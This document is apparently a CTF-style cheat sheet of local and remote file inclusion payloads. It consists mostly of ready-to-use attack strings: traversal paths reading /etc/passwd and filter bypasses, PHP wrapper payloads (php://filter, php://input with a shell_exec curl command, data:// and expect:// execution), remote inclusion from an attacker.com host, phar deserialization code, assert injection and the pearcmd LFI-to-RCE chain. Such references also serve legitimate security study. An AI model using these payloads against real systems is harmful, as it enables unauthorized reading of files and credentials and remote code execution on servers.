# LFI/RFI via Path Traversal
> LFI (commonly exploited through directory traversal) refers to the inclusion of unintended (but locally avaliable on the server) files into a frontend interface that can be accessed by an attacker.

This differs from RFI (Remote File Inclusion), which is the inclusion of remote files (not originally available on the server) that can result in RCE. LFI is usually milder compared to RFI, but can still be deadly in early stages of an attack, such as viewing the source of an application to identify possible vectors for RCE.

## OG exploit (path/directory traversal)

`https://example.com/?page=../../../../../../flag.txt`

### Filter bypass
`example.com/?page=....//....//etc/passwd`

`?page=..///////..////..//////etc/passwd`

Some applications may try to validate the start of the file path.  
`?page=/var/www/images/../../../etc/passwd`

You can also url-encode or double url-encode to bypass some filters.  
`?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`

`?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`

If the application checks for file extension:  
`?page=../../../etc/passwd%00.png`

## Python's urllib
urllib.request.urlopen() has a quirky built-in functionality to automatically parse `<URL:http://example.com>` and `<http://example.com>` to `http://example.com`. 

We can bypass certain filters like scheme filters this way, as urllib.parse.urlparse() doesn't do the same thing, but instead interprets the entire thing as the path.

## PHP

### Path truncation (bypass appending of more chars at end)

`example.com/?page=/etc/passwd%00`
(Fixed in php 5.3)
This will signal EOL and ignore the rest of filename after the null byte

### URL scheme exploits (works with functions like **file**, **open**, **fwrite**, **fclose**, **file_get_contents**, **file_put_contents** etc)

*NOTE: Remember to urlencode payloads if necessary!*

#### php://filter

After directory traversal has been identified, to view php source instead, use php file filters

`https://example.com/?page=php://filter/convert.base64-encode/resource=flag.php`

`https://example.com/?page=php://filter/read=string.rot13/resource=flag.php`

Other filters:
- [x] string.toupper
- [x] string.tolower
- [ ] string.strip\_tags

The filter is necessary to ensure the source is returned, instead of just executing the php. After returning the source, it can be decoded (b64decode for the former, rot13 for the latter)

> Sometimes RFI may also be possible.

#### http://

Can redirect to external source, such as attacker's server -> RCE
If extension is appended, bypass by added a query, `http://attacker.com/?q=` -> `include('http://attacker.com/?q=.php')`

#### php://input

Reads input from POST request body
`php://input`
`curl -X POST --data '<?php echo shell_exec('id'); ?>' 'https://example.com/?page=php://input' -k -v`

#### zip://

(note: following exploits appended where directory traversal was identified, eg. `example.com/?page=EXPLOIT`)
`zip://<zipfile>#<file>` to upload files zipped and decompress on target.

#### data://

`data://text/plain, <?php system($_GET["cmd"]);`
`data://text/plain;base64, <b64encoded-exploit>`

#### expect://

`expect://ls`

#### phar://

Note: not as useful, because phar file has to first be present on target. Useful if unrestricted uploads are allowed and filename can be determined. Also useful if app only reads the file, and doesn't execute it (in this case, deserialization = execution)
Create a phar file

```php
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method `__destruct()` or `__wakeup()` defined, then those methods are automatically invoked

```php
class AnyClass {
    function __destruct() {
            echo $this->data;
                }
                }
                // output: rips
                include('phar://test.phar');
```

### LFI/RCE via assert

If source looks like this:
`assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");`
`' and die(show_source('/etc/passwd')) or '` (similar to SQLi)
`' and die(system('whoami')) or '`

## proc filesystem

The /proc directory contains one subdirectory for each process running on the system, which is named after the process ID. PID can be bruteforced (up to 2^15).

`/proc/self` is a symlink that points to the currently running process. 

Intersting payloads:
- `/proc/[PID]/cmdline` (shows process invocation command, may expose paths, usernames, passwords)
- `/proc/[PID]/environ` (shows env vars)
- `/proc/[PID]/cwd` (shows current working directory)
- `/proc/[PID]/fd/[0-9]` (contains one entry for each file the process has open)

## PHP pearcmd LFI2RCE

pearcmd.php (installed by default on Docker php images, usually found at /usr/local/lib/php/pearcmd.php). 
This internally calls `pear`, which has a subcommand that allows us to create PHP config files.

`pear config-create <root path> <filename>`

The stuff in root path gets repeated a number of times in the config file. This is the output:

```
$ pear config-create "/tmp/<?=system('ls')>" /tmp/asdf.php
$ cat /tmp/asdf.php

#PEAR_Config 0.9
a:12:{s:7:"php_dir";s:30:"/tmp/<?=system('ls')>/pear/php";s:8:"data_dir";s:31:"/tmp/<?=system('ls')>/pear/data";s:7:"www_dir";s:30:"/tmp/<?=system('ls')>/pear/www";s:7:"cfg_dir";s:30:"/tmp/<?=system('ls')>/pear/cfg";s:7:"ext_dir";s:30:"/tmp/<?=system('ls')>/pear/ext";s:7:"doc_dir";s:31:"/tmp/<?=system('ls')>/pear/docs";s:8:"test_dir";s:32:"/tmp/<?=system('ls')>/pear/tests";s:9:"cache_dir";s:32:"/tmp/<?=system('ls')>/pear/cache";s:12:"download_dir";s:35:"/tmp/<?=system('ls')>/pear/download";s:8:"temp_dir";s:31:"/tmp/<?=system('ls')>/pear/temp";s:7:"bin_dir";s:26:"/tmp/<?=system('ls')>/pear";s:7:"man_dir";s:30:"/tmp/<?=system('ls')>/pear/man";}
```

Afterwards, `include`ing /tmp/asdf.php will execute `ls` a couple of times, and RCE will be achieved.

### Query string exploitation

`?path=../../../usr/local/lib/php/pearcmd.php&+config-create+tmp<?=system('ls')>+/tmp/asdf.php`

If you need spaces in your RCE, you can use ${IFS} (+ won't work as pear will treat it as a parameter delimiter)

*If your browser automatically URLencodes the special characters (`<?'>`), use curl or Burp Pro instead*

### Other LFI2RCE

https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/
